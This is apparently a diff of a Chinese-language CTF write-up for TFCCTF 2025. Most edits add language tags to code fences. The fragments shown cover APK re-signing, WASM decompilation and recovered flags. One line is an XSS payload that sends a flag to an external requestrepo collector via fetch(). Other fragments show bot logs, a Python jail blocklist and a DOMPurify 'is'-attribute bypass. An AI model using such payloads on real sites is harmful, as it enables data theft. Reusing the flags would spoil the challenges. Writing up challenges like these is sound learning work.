@@ -2049,7 +2049,7 @@ if __name__ == "__main__":
 
 获取并生成users.db
 
-```
+```python
 python .\message.py --base-url https://crooneytfc-655e0fb5087f0b1f.challs.tfcctf.com/ --username qqq --password qqq --output users.db
 ```
 
@@ -2610,19 +2610,19 @@ apktool b app-src -o app-unsigned.apk
 
 此时需要先生成key
 
-```
+```bash
 keytool -genkey -v -keystore test.jks -keyalg RSA -keysize 2048 -validity 10000 -alias testkey
 ```
 
 然后找到android sdk下的apksigner.bat
 
-```
+```text
 F:\android\build-tools\35.0.1\apksigner.bat sign --ks test.jks --ks-key-alias testkey --out app-signed.apk app-unsigned.apk
 ```
 
 然后就可以安装，再次执行上面的广播命令，结束后，点看apk去log里即可看到flag
 
-```
+```text
 08-30 00:00:03.162 12473 12473 D OXI     : Got broadcast, seed=fe2o3rust
 08-30 00:00:03.166 12473 12473 D OXI     : Required seed is: fe2o3rust
 08-30 00:00:03.166 12473 12473 D OXI     : Computing flag for seed='fe2o3rust' ...
@@ -2685,7 +2685,7 @@ wasm逆向，根目录python起一个http（python -m http.server 8888），然�
 
 首先还是wasm2c编译出来，得到可执行文件ida反编译更好分析
 
-```
+```bash
 wasm2c wasm_oscn_bg.wasm -o out.c
 gcc -c out.c -o out.o
 ```
@@ -2751,7 +2751,7 @@ for i in range(len(cmp)):
 
 得到flag
 
-```
+```text
 [128, 174, 165, 137, 152, 156, 140, 168, 152, 122, 162, 158, 129, 156]
 CTF{wh3n_w3_p4rt_w4ys__https://www.youtube.com/watch?v=EtrL9NkEphg}
 ```
@@ -3055,7 +3055,7 @@ count_rules, len(rev[target]), rev[target][:10]
 
 输出得到：
 
-```
+```text
 (2091,  1,  [('O0dd4bbd1dc3031e7985b2c4b2caee3b0', 'Od37ba43eb880c76fd73cf4d8044d97ad')])
 ```
 
@@ -3153,7 +3153,7 @@ fetch('https://kws1oh3y.requestrepo.com/?flag='+flag)
 
 这在我的浏览器上成功了,但是为什么bot不行？
 
-```
+```http
 app-1  | 192.168.18.173 - - [30/Aug/2025 02:04:31] "POST /report HTTP/1.1" 202 -
 app-1  | 127.0.0.1 - - [30/Aug/2025 02:04:32] "GET /login?username=27ffe8f85d20e7bae3ad45680567f64671a94b1a4708d96546dfb63788b84c6e&password=fb1a60ff69b9d842b9bcba78b930baa0d8de1420b210453b527188125c405264 HTTP/1.1" 302 -
 app-1  | 127.0.0.1 - - [30/Aug/2025 02:04:32] "GET / HTTP/1.1" 200 -
@@ -3171,13 +3171,13 @@ app-1  | [BOT] Done
 
 bot似乎没有加载iframe?
 
-```
+```javascript
 driver.get(f"http://127.0.0.1:5000/login?username={username}&password={password}")
 ```
 
 尝试提交127.0.0.1
 
-```
+```text
 url=http%3a%2f%2f127.0.0.1%3a5000%2fpost%2f12
 ```
 
@@ -3222,7 +3222,7 @@ banned = ["s", "l", "(", ")", "self", "_", ".", "\"", "\\", "import", "eval", "e
 
 发现band被传进去了
 
-```
+```text
 banned="&<>()"
 ```
 
@@ -3260,7 +3260,7 @@ ALLOWED_ATTR: ['id', 'class', 'name', 'href', 'title']
 
 > 因为特殊原因 DOMPurify 在有些情况无法清理is属性？
 
-```
+```javascript
 a=new DOMParser().parseFromString('<a is="to-delete">', "text/html");
 a.body.firstChild.removeAttribute("is");
 a.getRootNode().body.firstChild;
@@ -3269,7 +3269,7 @@ a.getRootNode().body.firstChild.outerHTML;
 >>> '<a is="to-delete"></a>'
 ```
 
-```
+```html
 <div is=></div>
 ```
 
